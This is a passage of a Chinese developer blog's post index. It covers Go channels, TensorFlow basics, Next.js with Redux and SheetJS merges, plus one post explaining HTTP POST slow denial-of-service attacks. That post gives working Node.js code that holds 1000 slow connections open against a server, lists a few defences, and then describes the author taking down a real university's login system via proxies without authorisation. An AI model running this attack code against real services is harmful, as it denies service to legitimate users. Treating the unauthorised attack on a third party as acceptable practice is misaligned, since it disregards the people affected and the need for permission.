数组即可。 12345// 合并第一行数据 [B1, C1, D1, E1]sheet['!merges'] = [&#123; s: &#123; c: 1, r: 0 &#125;, e: &#123; c: 4, r: 0 &#125;&#125;]; 参考资料 https://github.com/SheetJS/js-xlsx http://www.jianshu.com/p/5c131c27841c","categories":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/categories/Javascript/"}],"tags":[{"name":"后端","slug":"后端","permalink":"http://me.lizhooh.com/tags/后端/"},{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"}]},{"title":"探讨 HTTP POST 慢攻击原理与实现","slug":"网络安全/探讨 HTTP POST 慢攻击原理与实现","date":"2017-10-26T14:25:38.000Z","updated":"2021-06-15T06:10:52.923Z","comments":true,"path":"/stories/2017/10/网络安全/探讨 HTTP POST 慢攻击原理与实现/","link":"","permalink":"http://me.lizhooh.com/stories/2017/10/网络安全/探讨 HTTP POST 慢攻击原理与实现/","excerpt":"HTTP POST 慢攻击基于 HTTP 的攻击大多数以高速海量的请求堆积，让服务器/数据库忙不过来，直接使其失去响应，著名的有 DOS/CC 等攻击。但有一种攻击却反其道而行之，以慢著称，慢慢占用服务器资源，使其无法后序的处理服务，这就是慢速连接攻击。","text":"HTTP POST 慢攻击基于 HTTP 的攻击大多数以高速海量的请求堆积，让服务器/数据库忙不过来，直接使其失去响应，著名的有 DOS/CC 等攻击。但有一种攻击却反其道而行之，以慢著称，慢慢占用服务器资源，使其无法后序的处理服务，这就是慢速连接攻击。 HTTP POST 慢速 DOS 攻击第一次在技术社区被正式披露是 2010 年的 OWASP 大会上，由 Wong Onn Chee 和 Tom Brennan 共同演示了使用这一技术攻击的威力。这种攻击针对配置较低的服务器具有很强的威力，往往几台攻击客户端可以轻松击垮一台 Web 应用服务器，甚至是一台电脑就可以攻陷单机服务器。 POST 慢攻击的基本原理是：通过针对任意 HTTP Server，建立一个连接，指定一个比较大的 Header Content-length，然后以很低的速度发包，比如 1-10s 发一个字节，Hold 住这个连接不断开。如果客户端持续建立这样的连接，那么服务器上可用的连接数将很快被占满，从而导致 DOS。总而言之，就是通过 POST 慢连接消耗服务器总连接数（消耗的过程是快速的，只是连接是慢连接）。 HTTP POST 慢攻击有以下特点： 发起大量无意义的慢连接占领服务器的连接池。 它可以针对任意 POST 服务。HTTP 协议在接收到 request 之前是无法对请求内容作校验的，所以即使你的 Web 应用没有可用 form 表单，这个攻击一样有效。 非常廉价，在客户端以单线程或多线程方式建立较大数量的无用连接，并保持持续发包的代价非常低廉。实际试验中一台普通 PC 可以建立的 Socket 连接在 3000 个以上。这对一台普通的 web server，将是致命的打击的，就是不能占满连接池，也会对服务器资源造成一定的消耗。 HTTP Method 类型也不一定是 POST，也可以 PUT，DELETE 等，只要能满足攻击的条件即可。 Nodejs 上实现Nodejs 里的 http 模块非常灵活，支持数据分块发送，因此很容易的就可以使用 http 模块来进行 POST 慢攻击。由于 Nodejs 天生的单线程异步性能，这样就可以使用事件循环机制来模拟多连接，从而实现慢攻击，而不像其他语言一样需要创建 1000 多个线程来发送请求。 具体看下面的实现。 在 Go 里竟然实现不了，找不到数据分块发送的 API？ 攻击任务类创建一个攻击任务类，继承于 events，提供几个方法。（在 task.js 文件里） 123456789101112131415161718192021222324252627282930313233343536373839// task.jsconst EventEmitter = require('events');// 攻击任务类class Task extends EventEmitter &#123; constructor(req) &#123; super(); this.req = req; this.req.body = ''; &#125; run(interval = 1000 * 3, duration = 1000 * 60) &#123; // interval 秒一次，慢慢发数据 this._intervalTimer = setInterval(this.send.bind(this), interval); // duration 秒之后，自动结束 this._timeoutTimer = setTimeout(this.end.bind(this), duration); this.emit('start'); return this; &#125; send() &#123; // 256 字节 let buf = new Buffer(1 &lt;&lt; 8).fill(Math.random()); this.req.body += buf; this.req.write(buf); this.emit('send', buf); return this; &#125; end() &#123; const len = this.req.getHeader('Content-Length') - this.req.body.length; // 把剩下的发了 let buf = new Buffer(len).fill(Math.random()); this.req.body += buf; this.req.end(buf); this.emit('end'); clearInterval(this._intervalTimer); clearTimeout(this._timeoutTimer); return this; &#125;&#125;module.exports = Task; 简单模拟服务端使用 Nodejs 的 http 模块，来简单的模拟服务端，并设置它的最大连接数量为 500。（在 server.js 文件里） 12345678910111213141516171819202122232425262728293031323334353637383940414243444546// server.jsconst http = require('http');const colors = require('colors');// 客户端连接个数let cnum = 0;const server = http.createServer((req, res) =&gt; &#123; req.setEncoding('utf8'); res.statusCode = 200; res.setHeader('Content-Type', 'text/html'); if (req.url === '/favicon.ico') &#123; return res.end(''); &#125; cnum++; console.log(req.method, '新增连接，当前连接数：', `$&#123;cnum&#125;`.green); // POST if (req.method === 'POST') &#123; let body = ''; req.on('data', chunk =&gt; &#123; body += chunk; &#125;); req.on('end', () =&gt; &#123; cnum--; res.end(body.toString()); console.log(req.method, '完成连接，当前连接数：', `$&#123;cnum&#125;`.yellow); &#125;); req.on('error', () =&gt; &#123; cnum--; console.log(req.method, '断开连接，当前连接数：', `$&#123;cnum&#125;`.red); &#125;); &#125; else &#123; cnum--; res.end('Hello world!') console.log(req.method, '完成连接，当前连接数：', `$&#123;cnum&#125;`.yellow); &#125;&#125;);// 设置最大连接数量server.maxConnections = 500;server.listen(3000, () =&gt; &#123; console.log('server run in 3000');&#125;); 开始模拟攻击服务端写好后，先把服务端运行起来，接着在 client.js 里添加执行代码： 1234567891011121314151617181920212223242526272829303132333435// client.jsconst http = require('http');const Task = require('./task');// 最大连接数let max = 1000;http.globalAgent.maxSockets = max;const options = &#123; hostname: '127.0.0.1', port: 3000, path: '/test', method: 'post', headers: &#123; 'Content-Type': 'application/x-www-form-urlencoded', 'Content-Length': (1 &lt;&lt; 8) * (1 &lt;&lt; 8), // 也就 64k 左右 &#125;,&#125;;console.log(max + ' total slow post attack start.');[...new Array(max)].forEach(item =&gt; &#123; // 请求 const req = http.request(options).on('error', err =&gt; &#123; &#125;); new Task(req).run(3 * 1000, 10 * 1000) .on('start', () =&gt; &#123; // ... &#125;) .on('send', () =&gt; &#123; // ... &#125;) .on('end', () =&gt; &#123; // ... &#125;);&#125;); 上面，设置了最大的攻击数为 1000，并且设置了攻击持续时间为 10 秒（为了方便测试，时间设置小一点），每隔 3 秒发一次数据（256 b）。 运行的时候，服务端看到这样的情景，开始的时候迅速被占满了连接（服务器最大连接数为 500，攻击数为 1000）。 可以看出，如果攻击者一直不结束响应，可能会造成大量的慢连接占满了整个连接池，导致无法提供其他服务。 防御策略根据 HTTP POST 慢攻击的特点，列出了一些比较有用的防御建议。 针对 Apache 的服务器，检查日志，查找类似的错误报警：[error] server reached MaxClients setting, consider raising the MaxClients setting，并且封了对应的 IP 地址。 限制 HTTP 数据的大小，对于文件上传的接口无解。 限制 HTTP POST 超时、持续时间、最大 POST 大小为安全值范围。 实战在某大学的教务系统里尝试了一下 POST 慢攻击。页面带有类似 index.php 的后缀，可以简单的推断服务器是 Linux + Apache + Mysql + PHP 架构。前面说了，POST 慢攻击对 Apache 的效果十分明显，Apache 的 maxClients 几乎在瞬间被占满。 在登录接口里，进行 HTTP POST 慢攻击（高匿代理），连接数设置为 5000，一分钟持续 60s 。在笔记本上发起攻击，在手机上连上 4G 进行访问测试。 在攻击期间，目标网站直接失去响应或者拒绝服务。取消攻击，过几分钟后目标网站就正常访问了。可以说只要攻击者不停止攻击，目标网站就一直会无法正常访问，而且只是使用一台电脑就可以达到让服务器拒绝服务。 参考资料 http://blog.chinaunix.net/uid-26696966-id-3510191.html http://howto.eguidedog.net/node/545 http://support.huawei.com/huaweiconnect/enterprise/thread-367981.html","categories":[{"name":"网络安全","slug":"网络安全","permalink":"http://me.lizhooh.com/categories/网络安全/"}],"tags":[{"name":"后端","slug":"后端","permalink":"http://me.lizhooh.com/tags/后端/"},{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/tags/Nodejs/"},{"name":"网络安全","slug":"网络安全","permalink":"http://me.lizhooh.com/tags/网络安全/"}]},{"title":"再谈 Go 是如何控制异步流程","slug":"Go/再谈 Go 是如何控制异步流程","date":"2017-10-25T13:08:59.000Z","updated":"2021-06-15T06:10:52.818Z","comments":true,"path":"/stories/2017/10/Go/再谈 Go 是如何控制异步流程/","link":"","permalink":"http://me.lizhooh.com/stories/2017/10/Go/再谈 Go 是如何控制异步流程/","excerpt":"前言这是上一篇的续集：谈谈 Go 是如何控制异步流程。上篇尝试使用 sync.WaitGroup 来解决异步流程的问题，现在尝试使用 channel 来控制异步流程。 除了使用 sync.WaitGroup 外，还可以使用 channel，实际上 sync.WaitGroup 的源码里就是使用了 channel，归根到底就是对 channel 的友好封装。不过使用 channel 时要格外小心，一不留意有可能会出现死锁的情况。","text":"前言这是上一篇的续集：谈谈 Go 是如何控制异步流程。上篇尝试使用 sync.WaitGroup 来解决异步流程的问题，现在尝试使用 channel 来控制异步流程。 除了使用 sync.WaitGroup 外，还可以使用 channel，实际上 sync.WaitGroup 的源码里就是使用了 channel，归根到底就是对 channel 的友好封装。不过使用 channel 时要格外小心，一不留意有可能会出现死锁的情况。 channelchannel（直译为”通道”）是 Go 提供的 goroutine 之间的通讯方式，可以使用 channel 在两个或多个 goroutine 之间传递消息。channel 是类型相关的，一个 channel 只能传递一种类型的值。 channel 可以简单的声明，也可以使用 make 来创建。 123var ch1 chan int // 声明一个 int 类型的 channelch2 := make(chan int) // 创建了一个无缓冲的 channelch3 := make(chan int, 10) // 创建了一个缓冲为 10 的 channel 在 channel 的用法中，最常见的包括写入和读出。&lt;- 操作符用来接受和发送消息 ch &lt;- 1，发送 1 进入管道，val := &lt;-ch 从管道接收消息。具体发送的类型在定义时指定。 一般来说，对 channel 进行的操作会有 4 种： 创建 chennel（make(chan int)） 放入数据（ch &lt;- 1） 取出数据（val := &lt;-ch） 关闭 channel（close(ch)） 特性channel 有一些非常给力的性质，并且繁琐的特性： channel 是一种阻塞管道，而且是自动阻塞的，这是 channel 最重要的一个性质，没有之一。 channel 分为有缓冲的 channel 和 无缓冲的 channel。 关闭后的 channel 可以取数据，但是不能放数据，它变成了只读状态，等待所有数据读取完毕后才真正关闭。 channel 是一种阻塞管道，是自动阻塞的。 如果管道满了，此时对 channel 进行放入数据操作（ch &lt;- 1）就会阻塞线程，直到有某个 goroutine 从 channel 中取出数据为止。如果 channel 里没有数据了，对其进行取出数据操作也会发生阻塞，直到某个 goroutine 从 channel 中放入数据为止 。 12345678func main() &#123; ch := make(chan int, 2) // 缓冲容量为 2 ch &lt;- 1 // &lt;- 1 只是表明，传递数据 1 ch &lt;- 1 // 到这里，ch 已经满了 ch &lt;- 1 // 很明显这里会阻塞，看不到 ok 的输出 fmt.Println(\"ok\")&#125; 123456func main() &#123; ch := make(chan int, 10) &lt;-ch // 这里发生阻塞，因为 channel 才刚创建，是空的，没有东西可以取出 fmt.Println(\"ok\")&#125; channel 分为有缓冲的 channel 和无缓冲的 channel。在大多数情况下，比较建议使用有缓冲的。 对于无缓冲的 channel，放入操作和取出操作不能再同一个 goroutine 中（否则发生死锁），而且应该是先确保有某个 goroutine 对它执行取出操作，然后才能在另一个 goroutine 中执行放入操作。 对于带缓冲的 channel，就没那么多讲究了，因为有缓冲空间，所以只要缓冲区不满，放入操作就不会阻塞，同样，只要缓冲区不空，取出操作就不会阻塞。而且，带有缓冲的 channel 的放入和取出可以用在同一个 goroutine 中。 因此，可以利用 channel 在满载时会发生自动阻塞的特性来实现并发量的控制： 123456789101112131415161718192021222324package mainimport ( \"fmt\" \"time\")func work(i int, ch chan int) &#123; fmt.Println(\"finish\", i) time.Sleep(time.Second * 3) &lt;-ch&#125;func main() &#123; // 这里利用的是，缓冲满了会自动阻塞的特性 ch := make(chan int, 10) for i := 0; i &lt; 1000; i++ &#123; // 每当创建 goroutine 的时候就向 channel 中放入一个数据，如果里面已经有 10 个数据了， // 就会自动阻塞，由此我们将同时运行的 goroutine 的总数控制在 &lt;=10 个的范围内。 ch &lt;- 1 // 缓冲满了后，会阻塞在这里 go work(i, ch) &#125;&#125; 上面的代码就是控制着每轮并发量为 10 的执行 work 函数，在等候 3s 后再从 channel 里取出数据，腾出空间，继续下一轮并发。 有时候一定要注意放入和取出的速率问题，上面的代码更改一下： 12345678for i := 0; i &lt; 1000; i++ &#123; ch &lt;- 1 ch &lt;- 1 ch &lt;- 1 ch &lt;- 1 ch &lt;- 1 go work(i, ch)&#125; 很明显，放进数据的速度比取出数据的速度要快（5倍）。在 for 执行完成后，总共放入 5k，才取出 1k，这种情况下最后会造成死锁。 关闭后的 channel 可以取数据，但是不能放数据。 12345678910func main() &#123; ch := make(chan int, 10) ch &lt;- 1 ch &lt;- 1 close(ch) ch &lt;- 1 // 关闭后，不能进行放入数据 &lt;-ch // 取数据是没问题的 &lt;-ch&#125; 传输数据使用 go 之后是不能直接在 return 里接收返回数据的，可以利用 chan 来接收数据或者传递一个引用值，通过引用方式传递数据。 123456789func add(a int, b int, ch chan int) &#123; ch &lt;- a + b&#125;func main() &#123; ch := make(chan int) go add(1, 2, ch) fmt.Println(&lt;-ch) // 输出 3&#125; 异步流程channel 与 sync.WaitGroup 同样能控制异步流程，但是 channel 比 sync.WaitGroup 需要更多注意的地方，一不留意可能就发生了死锁。 下面使用 channel 来等待所有异步操作的完成。 1234567891011121314151617181920212223242526272829303132package mainimport ( \"fmt\" \"time\")var ch chan intfunc work(n int64, str string) &#123; time.Sleep(time.Duration(n * 1000 * 1000)) fmt.Println(str) ch &lt;- 1&#125;func main() &#123; ch = make(chan int, 10) begin := time.Now() go work(1000, \"[左手工作]：工作了 1 秒\") go work(3000, \"[右手工作]：工作了 3 秒\") go work(5000, \"[左手工作]：工作了 5 秒\") // 想想为什么是三个？ &lt;-ch &lt;-ch &lt;-ch fmt.Println(\"[全部工作完]：用时 5 秒\") fmt.Println(time.Since(begin))&#125; 输出： 12345[左手工作]：工作了 1 秒[右手工作]：工作了 3 秒[左手工作]：工作了 5 秒[全部工作完]：用时 5 秒5.000286s 在这段代码里实际上是利用了 channel 的自动阻塞特性。 这里的代码块分为两部分：现在进行时，将来运行时。现在进行时包括了，ch 的创建，3 个 ch 的取出数据操作，Println 输出，而将来运行时包括了，3 个 goroutine 函数，以及 3 个 ch 放入数据。 一开始的时候，channel 为空，此时对它进行取出数据，导致了当前的 routine 发生了阻塞，所以就看不到 Println 的输出。等待在 work 函数里放入数据后，才解除阻塞，最后看到 Println 输出的信息。 小结goroutine + channel 是 Go 上控制异步流程的一个解决方案，它的控制方式非常灵活，具体根据需求去设计。 参考资料 https://studygolang.com/articles/2027 https://studygolang.com/articles/6106","categories":[{"name":"Go","slug":"Go","permalink":"http://me.lizhooh.com/categories/Go/"}],"tags":[{"name":"后端","slug":"后端","permalink":"http://me.lizhooh.com/tags/后端/"},{"name":"Go","slug":"Go","permalink":"http://me.lizhooh.com/tags/Go/"}]},{"title":"认识 TensorFlow","slug":"TensorFlow/拥抱 TensorFlow","date":"2017-10-22T09:09:38.000Z","updated":"2021-06-15T06:10:52.896Z","comments":true,"path":"/stories/2017/10/TensorFlow/拥抱 TensorFlow/","link":"","permalink":"http://me.lizhooh.com/stories/2017/10/TensorFlow/拥抱 TensorFlow/","excerpt":"前言TensorFlow 是 Google Brain 团队开发的强大机器学习开源项目，也是目前流行的深度学习框架。如果想学习机器学习与深度学习，那就一定要掌握 TensorFlow，为什么这么说？因为 TensorFlow 实在是太火，在 Github 上有 将近 74k 个 star，相比 React 79k，React Native 55k，Vue 71k，悄然走进了 10 大热门开源项目。 本文将记录着 TensorFlow 的入门知识： TensorFlow 本地环境搭建 TensorFlow Hello world TensorFlow 基本知识","text":"前言TensorFlow 是 Google Brain 团队开发的强大机器学习开源项目，也是目前流行的深度学习框架。如果想学习机器学习与深度学习，那就一定要掌握 TensorFlow，为什么这么说？因为 TensorFlow 实在是太火，在 Github 上有 将近 74k 个 star，相比 React 79k，React Native 55k，Vue 71k，悄然走进了 10 大热门开源项目。 本文将记录着 TensorFlow 的入门知识： TensorFlow 本地环境搭建 TensorFlow Hello world TensorFlow 基本知识 本地环境配置因为我是使用 windows 开发的，所以这里这里暂时这记录 windows 上的环境配置。 准备： windows 64位 python 3.5+ pip 9.0.1+ 说明：在安装之前请配置好 pip 的国内镜像，可能会被墙，出现速度只有 10k 的现象。 使用 pip 安装（50+ MB)： 1234# CPU 版本pip install --upgrade tensorflow# GPU 版本pip install --upgrade tensorflow-gpu 如果你想安装 GPU 版本，请确保是 NVIDIA®GPU。 具体参考：https://www.tensorflow.org/install/install_windows Hello world编写一个 Hello world 检验是否安装成功。 1234import tensorflow as tfhello = tf.constant('Hello，TensorFlow!') # 创建常量sess = tf.Session() # 创建会话print(sess.run(hello)) # 执行训练 运行起来，如果你看到，很多句警告：The TensorFlow library wasn’t compiled to use FMA instructions，but these are available on your machine and could speed up CPU computations. 那么恭喜了，又踩了一个坑，我们可以直接屏蔽它，添加到首行： 12import osos.environ['TF_CPP_MIN_LOG_LEVEL']='2' 具体参考：https://github.com/tensorflow/tensorflow/issues/7778 基本知识 使用 TensorFlow，你必须明白 TensorFlow。 使用图（graph）来表示计算任务。 在被称之为会话（session）的上下文（context）中执行图。 使用 tensor 表示数据。 通过 变量（variabl）维护状态。 使用 session.run 来执行训练。 使用 feed 和 fetch 可以为任意的操作（arbitrary operation）赋值或者从其中获取数据。 TensorFlow 是一个编程系统，使用图来表示计算任务。图中的节点被称之为 op（operation 的缩写）。一个 op 获得 0 个或多个 Tensor，执行计算，产生 0 个或多个 Tensor。每个 Tensor 是一个类型化的多维数组。例如，你可以将一小组图像集表示为一个四维浮点数数组，这四个维度分别是 [batch，height，width，channels]。 计算图TensorFlow 程序通常被组织成一个构建阶段和一个执行阶段。在构建阶段，op 的执行步骤被描述成一个图。在执行阶段，使用会话执行图中的 op。 例如，通常在构建阶段创建一个图来表示和训练神经网络，然后在执行阶段反复执行图中的训练 op。 构建图构建图的第一步，是创建源 op (source op)。源 op 不需要任何输入，例如 常量 (Constant)。源 op 的输出被传递给其它 op 做运算。 Python 库中, op 构造器的返回值代表被构造出的 op 的输出，这些返回值可以传递给其它 op 构造器作为输入。 下面通过计算矩阵相乘运算，来得到一个图： 12345678910111213141516171819import tensorflow as tf# 创建一个常量 op, 产生一个 1x2 矩阵. 这个 op 被作为一个节点（node）# 加到默认图中.## 构造器的返回值代表该常量 op 的返回值.# tf.constant(value, dtype=None, shape=None, name='Const')# 创建一个常数 tensormatrix1 = tf.constant([[3., 3.]])# 创建另外一个常量 op, 产生一个 2x1 矩阵.matrix2 = tf.constant([[2.],[2.]])# 创建一个矩阵乘法 matmul op , 把 'matrix1' 和 'matrix2' 作为输入.# 返回值 'product' 代表矩阵乘法的结果.product = tf.matmul(matrix1, matrix2)print(product) # =&gt; Tensor(\"MatMul:0\", shape=(1, 1), dtype=float32) 在一个会话中启动图构造阶段完成后，才能启动图。启动图的第一步是创建一个 Session 对象，如果无任何创建参数，会话构造器将启动默认图。 123456789101112131415161718# 启动默认图.sess = tf.Session()# 调用 sess 的 'run()' 方法来执行矩阵乘法 op, 传入 'product' 作为该方法的参数.# 上面提到, 'product' 代表了矩阵乘法 op 的输出, 传入它是向方法表明, 我们希望取回# 矩阵乘法 op 的输出.## 整个执行过程是自动化的, 会话负责传递 op 所需的全部输入. op 通常是并发执行的.## 函数调用 'run(product)' 触发了图中三个 op (两个常量 op 和一个矩阵乘法 op) 的执行.## 返回值 'result' 是一个 numpy `ndarray` 对象.# run 是训练result = sess.run(product)print(result) # =&gt; [[ 12.]]# 任务完成, 关闭会话.sess.close() Session 对象在使用完后需要关闭以释放资源。除了显式调用 close 外，也可以使用 “with” 代码块 来自动完成关闭动作： 123with tf.Session() as sess: result = sess.run([product]) print result 实现上，TensorFlow 将图形定义转换成分布式执行的操作，以充分利用可用的计算资源(如 CPU 或 GPU)。如果机器上有超过一个可用的 GPU，除第一个外的其它 GPU 默认是不参与计算的。为了让 TensorFlow 使用这些 GPU，你必须将 op 明确指派给它们执行。with…Device 语句用来指派特定的 CPU 或 GPU 执行操作： 12345with tf.Session() as sess: with tf.device(\"/gpu:1\"): matrix1 = tf.constant([[3., 3.]]) matrix2 = tf.constant([[2.],[2.]]) product = tf.matmul(matrix1, matrix2) 设备用字符串进行标识，目前支持的设备包括： /cpu:0: 机器的 CPU。 /gpu:0: 机器的第一个 GPU，如果有的话。 /gpu:1: 机器的第二个 GPU，以此类推。 交互式使用为了便于使用诸如 IPython 之类的 Python 交互环境，可以使用 InteractiveSession 代替 Session 类，使用 Tensor.eval() 和 Operation.run() 方法代替 Session.run()。这样可以避免使用一个变量来持有会话。 12345678910111213# 进入一个交互式 TensorFlow 会话.import tensorflow as tfsess = tf.InteractiveSession()x = tf.Variable([1.0, 2.0])a = tf.constant([3.0, 3.0])# 使用初始化器 initializer op 的 run() 方法初始化 'x'x.initializer.run()# 增加一个减法 sub op, 从 'x' 减去 'a'. 运行减法 op, 输出结果sub = tf.sub(x, a)print(sub.eval()) # =&gt; [-2. -1.] TensorTensorFlow 程序使用 tensor 数据结构来代表所有的数据。计算图中，操作间传递的数据都是 tensor。你可以把 TensorFlow tensor 看作是一个n 维的数组或列表。一个 tensor 包含一个静态类型 rank，和 一个 shape。 变量变量维护图执行过程中的状态信息。 下面的例子演示了如何使用变量实现一个简单的计数器。 12345678910111213141516171819202122232425262728import tensorflow as tf# 创建一个变量, 初始化为标量 0.state = tf.Variable(0, name=\"counter\")# 创建一个 op, 其作用是使 state 增加 1one = tf.constant(1)new_value = tf.add(state, one) # 类似加法，把 state 与 one 相加update = tf.assign(state, new_value) # 类似赋值，把 state 的值变为 new_value# 启动图后, 变量必须先经过`初始化` (init) op 初始化,# 首先必须增加一个`初始化` op 到图中.init_op = tf.initialize_all_variables()# 启动图, 运行 opsess = tf.Session()# 运行 'init' opsess.run(init_op)# 打印 'state' 的初始值print(sess.run(state))# 运行 op, 更新 'state', 并打印 'state'# run: 训练 3 次for i in range(3): sess.run(update) print(sess.run(state)) # =&gt; 0 1 2 3sess.close() 通常会将一个统计模型中的参数表示为一组变量。例如，你可以将一个神经网络的权重作为某个变量存储在一个 tensor 中。在训练过程中，通过重复运行训练图，更新这个 tensor。 Fetch为了取回操作的输出内容，可以在使用 Session 对象的 run() 调用执行图时，传入一些 tensor，这些 tensor 会帮助你取回结果. 在之前的例子里，我们只取回了单个节点 state，但是你也可以取回多个 tensor： 123456789101112import tensorflow as tfinput1 = tf.constant(3.0)input2 = tf.constant(2.0)input3 = tf.constant(5.0)intermed = tf.add(input2, input3) # 2 + 5 = 7mul = tf.multiply(input1, intermed) # 3 * 7 = 21sess = tf.Session()result = sess.run([mul, intermed])print(result) # =&gt; [21.0, 7.0]sess.close() 参考资料 https://www.tensorflow.org/ https://github.com/tensorflow/tensorflow","categories":[{"name":"TensorFlow","slug":"TensorFlow","permalink":"http://me.lizhooh.com/categories/TensorFlow/"}],"tags":[{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"Python","slug":"Python","permalink":"http://me.lizhooh.com/tags/Python/"},{"name":"深度学习","slug":"深度学习","permalink":"http://me.lizhooh.com/tags/深度学习/"},{"name":"TensorFlow","slug":"TensorFlow","permalink":"http://me.lizhooh.com/tags/TensorFlow/"}]},{"title":"如何在 Next.js 里使用 Redux ？","slug":"同构/Next/如何在 Next.js 里使用 Redux ？","date":"2017-10-21T14:39:17.000Z","updated":"2021-06-15T06:10:52.909Z","comments":true,"path":"/stories/2017/10/同构/Next/如何在 Next.js 里使用 Redux ？/","link":"","permalink":"http://me.lizhooh.com/stories/2017/10/同构/Next/如何在 Next.js 里使用 Redux ？/","excerpt":"前言如果 React 应用变得非常复杂，这可能需要一个 object tree 来维护应用的状态。 使用 Redux在 Next.js 里使用 Redux，与原来在 React 里使用 Redux 是有一点差别的，但总体差别不大。 如果要想把 Redux 的数据连接到组件，比较常见的是使用 react-redux 来连接。","text":"前言如果 React 应用变得非常复杂，这可能需要一个 object tree 来维护应用的状态。 使用 Redux在 Next.js 里使用 Redux，与原来在 React 里使用 Redux 是有一点差别的，但总体差别不大。 如果要想把 Redux 的数据连接到组件，比较常见的是使用 react-redux 来连接。 1234567import &#123; connect &#125; from 'react-redux';import * as actions from '../redux/actions/news';// ...export default connect( state =&gt; (&#123; state: state.news &#125;), // this.props.state.xxx actions // this.props.xxx)(AddCount) 而在 Next.js 里比较特殊，分为两个类型：pages，components。 在 pages 里，需要使用 Next 提供的连接函数： 12345678910111213141516import &#123; initStore &#125; from '../redux/store';import * as actions from '../redux/actions/news';import withRedux from 'next-redux-wrapper';class News extends Component &#123; static getInitialProps(&#123; store &#125;) &#123; // ... store 是固定的参数名 &#125; // ... some&#125;// ...export default withRedux( initStore, // createStore state =&gt; (&#123; state: state.news &#125;), // this.props.state.xxx actions // this.props.xxx)(News) 在 pages 目录下唯一的区别是，需要使用 withRedux 而不是 connect，需要把初始化 store 加载进去，并且 store 将成为 getInitialProps 的参数属性。 initStore 是返回一个 Store，一般你可以这样写： 1234567const initStore = (initialState = initialState) =&gt; &#123; return createStore( combineReducers(reducers), initialState, applyMiddleware(thunk) );&#125; 或者可以使用我写的一个模块，便捷的创建 Store。 12import Store from 'redux-store-init';const initStore = Store(&#123; reducers, initState &#125;, [thunk]); 效果都一样，只不过是做了一层封装。 而在 components 目录下，基本与之前的无异： 1234567import &#123; connect &#125; from 'react-redux';import * as actions from '../redux/actions/news';// ...export default connect( state =&gt; (&#123; state: state.news &#125;), // this.props.state.xxx actions // this.props.xxx)(AddCount) 渲染时的差异为什么在 pages 里需要把初始化的 store 加载进去，官方在文档里大概说明了一下。 withredux 函数接受 makestore 作为第一个参数，其他参数都是与 connect() 相对应的。 在渲染的第一次的时候，withredux 会把初始化的 store 作为服务端渲染的初始化数据，之后会把 store 迁移到了客户端，由客户端来维护。也就是说之后的状态变化都发生在客户端，服务端只做初始化 Redux Store 的工作。 所以，可以在 getInitialProps 做一些更新 store 的操作，这时 store 还是在服务端。经过 getInitialProps 后，store 就会到达客户端，由客户端接管维护。 123456789101112131415161718192021222324252627282930313233import &#123; initStore &#125; from '../redux/store';import * as actions from '../redux/actions/news';import withRedux from 'next-redux-wrapper';class News extends Component &#123; static getInitialProps(&#123; store, req, query &#125;) &#123; // ... const id = query.id; store.dispatch(actions.init(id)); // 触发一个 action // init 函数里，主要与数据库交换获取页面数据 &#125; render() &#123; const &#123; list &#125; = this.props.state; return ( &lt;div&gt; ... &lt;ul&gt;&#123; list.map((item, index) =&gt; ( &lt;li&gt;&#123;item.name&#125;&lt;/li&gt; )) &#125;&lt;/ul&gt; ... &lt;/div&gt; ) &#125;&#125;export default withRedux( initStore, // createStore state =&gt; (&#123; state: state.news &#125;), // this.props.state.xxx actions // this.props.xxx)(News) 数据流动关系在 getInitialProps 里的返回值会自动注入到页面组件的 props 里。 123456789101112class News extends Component &#123; static getInitialProps() &#123; return &#123; name: '小明' &#125; &#125; constructor(props) &#123; super(props); console.log(this.props.name); // 小明 &#125; // ...&#125; 数据的流动是：getInitialProps -&gt; constructor。 如果使用了 Redux，那么数据的流动是：getInitialProps -&gt; initStore -&gt; constructor。 这里需要注意的是：在 getInitialProps 里返回的值会直接被 initStore 中同名的属性或方法覆盖。 12345678910111213141516171819202122232425262728class News extends Component &#123; static getInitialProps() &#123; return &#123; state: &#123; name: '小明' &#125;, version: '1.0.0', &#125; &#125; constructor(props) &#123; super(props); console.log(this.props.version); // 1.0.0 console.log(this.props.state); // &#123; name: '小美' &#125; &#125; // ...&#125;const initStore = &#123; news: &#123; name: '小美' &#125;&#125;export default withRedux( initStore, // createStore state =&gt; (&#123; state: state.news &#125;), // this.props.state.xxx actions // this.props.xxx)(News) Redux Dev Tool在 React Redux 里，可能是这样开启 Redux 调试工具： 12window.__REDUX_DEVTOOLS_EXTENSION__ &amp;&amp;window.__REDUX_DEVTOOLS_EXTENSION__() 而在 Next 里，不能这样写。因为在 getInitialProps 之前的代码是没有浏览器 window 对象的。 所以只能这样开启 Redux Dev Tool： 1234567891011import &#123; composeWithDevTools &#125; from 'redux-devtools-extension'export const initStore = (initialState = initialState) =&gt; &#123; return createStore( combineReducers(reducers), initialState, composeWithDevTools( applyMiddleware(thunk) // 中间件 redux-thunk ) );&#125; 参考资料 https://github.com/zeit/next.js/tree/master/examples/with-redux","categories":[{"name":"同构","slug":"同构","permalink":"http://me.lizhooh.com/categories/同构/"}],"tags":[{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/tags/React/"},{"name":"服务端渲染","slug":"服务端渲染","permalink":"http://me.lizhooh.com/tags/服务端渲染/"},{"name":"Next","slug":"Next","permalink":"http://me.lizhooh.com/tags/Next/"},{"name":"同构","slug":"同构","permalink":"http://me.lizhooh.com/tags/同构/"}]},{"title":"Go 在数据持久化方面的知识","slug":"Go/Go 在数据持久化方面的知识","date":"2017-10-20T14:15:10.000Z","updated":"2021-06-15T06:10:52.818Z","comments":true,"path":"/stories/2017/10/Go/Go 在数据持久化方面的知识/","link":"","permalink":"http://me.lizhooh.com/stories/2017/10/Go/Go 在数据持久化方面的知识/","excerpt":"前言数据持久化几乎是每个编程语言必备的知识，当然 Go 也不例外。Go 在数据持久化方面，包括了 Mysql，Mongodb，Redis 方面的使用。 JSON谈到数据必谈 JSON。来看看如何在 Go 里优雅的定义与解析 JSON 数据。","text":"前言数据持久化几乎是每个编程语言必备的知识，当然 Go 也不例外。Go 在数据持久化方面，包括了 Mysql，Mongodb，Redis 方面的使用。 JSON谈到数据必谈 JSON。来看看如何在 Go 里优雅的定义与解析 JSON 数据。 原生库使用 Go 原生的 encoding/json 来定义与解析 json 数据。 func Marshal(v interface{}) ([]byte, error)func Unmarshal(data []byte, v interface{}) error 